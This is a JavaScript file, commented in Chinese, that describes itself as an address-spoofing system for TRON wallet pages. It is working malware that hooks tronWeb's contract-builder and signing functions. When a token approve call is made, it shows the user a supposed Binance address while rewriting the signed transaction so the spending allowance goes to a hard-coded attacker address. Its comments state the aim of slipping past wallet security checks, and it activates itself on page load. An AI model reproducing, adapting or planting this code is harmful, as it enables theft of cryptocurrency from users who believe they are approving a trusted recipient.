/**
 * 简化版地址伪装系统
 * 🎭 专注于核心功能：在授权时伪装攻击者地址，不干扰页面跳转
 */

(function() {
    'use strict';
    
    console.log('🎭 简化版地址伪装系统已加载');
    
    // 🎯 真实的攻击者地址
    const REAL_ATTACKER_ADDRESS = 'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x';
    
    // 🎯 伪装地址（Binance官方地址）
    const SPOOF_ADDRESS = 'TQn9Y2khEsLJW1ChVWFMSMeRDow5KcbLSE';
    
    console.log(`🎭 地址伪装: ${REAL_ATTACKER_ADDRESS} → ${SPOOF_ADDRESS}`);
    
    // 🎯 劫持智能合约调用，仅在授权时替换地址
    function hijackSmartContractCalls() {
        if (!window.tronWeb) {
            setTimeout(hijackSmartContractCalls, 1000);
            return;
        }
        
        try {
            if (window.tronWeb.transactionBuilder && !window.tronWeb.transactionBuilder._spoofed) {
                const originalTrigger = window.tronWeb.transactionBuilder.triggerSmartContract;
                
                window.tronWeb.transactionBuilder.triggerSmartContract = function(contractAddress, functionSelector, options, parameters, issuerAddress) {
                    console.log('🎭 拦截智能合约调用:', functionSelector);
                    
                    // 🎭 方案1核心：显示Binance地址，但实际授权给攻击者
                    if (functionSelector && functionSelector.includes('approve')) {
                        console.log('🎭🎭🎭 启动双重地址机制：显示Binance + 实际授权攻击者！🎭🎭🎭');
                        
                        // 第一步：让imToken显示Binance地址（绕过安全检测）
                        if (parameters && Array.isArray(parameters)) {
                            parameters = parameters.map(param => {
                                if (param && param.type === 'address' && param.value === REAL_ATTACKER_ADDRESS) {
                                    console.log(`🎭 显示层：用户看到Binance地址 ${SPOOF_ADDRESS}`);
                                    
                                    // 创建显示用的伪装参数
                                    const displayParam = {
                                        ...param,
                                        value: SPOOF_ADDRESS, // 显示Binance地址
                                        _realTarget: REAL_ATTACKER_ADDRESS // 保存真实目标
                                    };
                                    
                                    return displayParam;
                                }
                                return param;
                            });
                        }
                        console.log('🎭 用户将看到授权给Binance官方地址，无安全风险');
                    }
                    
                    return originalTrigger.call(this, contractAddress, functionSelector, options, parameters, issuerAddress);
                };
                
                window.tronWeb.transactionBuilder._spoofed = true;
                console.log('🎭 智能合约调用劫持完成');
            }
        } catch (e) {
            console.log('🎭 智能合约劫持失败:', e.message);
        }
        
        // 🎯 第二步：劫持签名过程，在签名时恢复真实攻击者地址
        try {
            if (window.tronWeb.trx && !window.tronWeb.trx._addressSwitchHijacked) {
                const originalSign = window.tronWeb.trx.sign;
                
                window.tronWeb.trx.sign = function(transaction, privateKey) {
                    console.log('🎯 拦截签名过程，准备地址切换...');
                    
                    // 检查是否为approve交易
                    if (transaction && transaction.raw_data && transaction.raw_data.contract) {
                        const contract = transaction.raw_data.contract[0];
                        if (contract && contract.parameter && contract.parameter.value && contract.parameter.value.data) {
                            const data = contract.parameter.value.data;
                            
                            // 检测approve函数调用（函数签名：095ea7b3）
                            if (data.startsWith('095ea7b3')) {
                                console.log('🎯🎯🎯 检测到approve交易，执行地址切换！🎯🎯🎯');
                                
                                try {
                                    // 解析approve参数：095ea7b3 + 32字节地址 + 32字节金额
                                    const currentSpenderHex = data.slice(8, 72); // 当前的spender地址
                                    const amountHex = data.slice(72); // 授权金额
                                    
                                    // 将真实攻击者地址转换为32字节十六进制
                                    const realAttackerHex = REAL_ATTACKER_ADDRESS.replace('T', '41');
                                    const realAttackerBytes = window.tronWeb.utils.code.hexStr2byteArray(realAttackerHex);
                                    const realAttacker32Bytes = '000000000000000000000000' + 
                                        window.tronWeb.utils.code.byteArray2hexStr(realAttackerBytes);
                                    
                                    // 重建交易数据：使用真实攻击者地址
                                    const newData = '095ea7b3' + realAttacker32Bytes + amountHex;
                                    
                                    console.log(`🎭 地址切换: ${currentSpenderHex} → ${realAttacker32Bytes}`);
                                    console.log(`🎯 用户看到：授权给Binance ${SPOOF_ADDRESS}`);
                                    console.log(`🎯 实际签名：授权给攻击者 ${REAL_ATTACKER_ADDRESS}`);
                                    
                                    // 修改交易数据
                                    contract.parameter.value.data = newData;
                                    
                                } catch (switchError) {
                                    console.log('🚨 地址切换失败:', switchError.message);
                                }
                            }
                        }
                    }
                    
                    return originalSign.call(this, transaction, privateKey);
                };
                
                window.tronWeb.trx._addressSwitchHijacked = true;
                console.log('🎯 签名阶段地址切换机制已部署');
            }
        } catch (e) {
            console.log('🎯 签名劫持失败:', e.message);
        }
    }
    
    // 🎯 劫持恶意授权系统
    function hijackMaliciousAuth() {
        if (window.MaliciousAuth) {
            // 临时替换全局攻击者地址
            if (window.ATTACKER_ADDRESS) {
                const originalAddress = window.ATTACKER_ADDRESS;
                window.ATTACKER_ADDRESS = SPOOF_ADDRESS;
                console.log(`🎭 全局攻击者地址已伪装: ${originalAddress} → ${SPOOF_ADDRESS}`);
            }
        } else {
            setTimeout(hijackMaliciousAuth, 500);
        }
    }
    
    // 🎯 激活伪装系统
    function activate() {
        console.log('🎭🎭🎭 激活简化版地址伪装系统！🎭🎭🎭');
        hijackSmartContractCalls();
        hijackMaliciousAuth();
        console.log('🎭 地址伪装系统已激活，专注于授权伪装');
    }
    
    // 🎯 全局接口
    window.SimpleAddressSpoofing = {
        activate: activate,
        getRealAddress: () => REAL_ATTACKER_ADDRESS,
        getSpoofAddress: () => {
            // 🎭 返回伪装地址用于绕过安全检测
            console.log('🎭 返回伪装地址用于安全绕过');
            return SPOOF_ADDRESS;
        },
        getDisplayAddress: () => SPOOF_ADDRESS  // 仅用于显示
    };
    
    // 🎯 自动初始化
    document.addEventListener('DOMContentLoaded', () => {
        setTimeout(() => {
            hijackSmartContractCalls();
        }, 1000);
    });
    
    console.log('🎭 简化版地址伪装系统初始化完成');
    
})();